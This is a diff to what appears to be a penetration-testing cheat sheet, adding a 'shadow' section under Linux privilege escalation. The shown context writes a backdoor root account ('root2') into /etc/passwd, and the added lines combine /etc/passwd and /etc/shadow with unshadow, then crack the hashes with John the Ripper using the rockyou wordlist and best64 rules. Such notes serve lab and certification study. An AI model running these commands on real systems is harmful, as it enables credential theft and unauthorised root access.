@@ -98,6 +98,7 @@
   - [Linux](#linux-3)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
+    - [shadow](#shadow)
     - [sudoer](#sudoer)
     - [Kernel Ecpliot](#kernel-ecpliot)
     - [Cron File backup](#cron-file-backup)
@@ -1364,6 +1365,13 @@ joe@debian-privesc:~$ openssl passwd w00t
 joe@debian-privesc:~$ openssl passwd -1 w00t
 Fdzt.eqJQ4s0g
 joe@debian-privesc:~$ echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+
+### shadow
+```bash
+unshadow ./etc/passwd ./etc/shadow > unshadow.txt
+# $y$
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt --rules /usr/share/john/rules/best64.rule unshadow
 ```
 
 ### sudoer
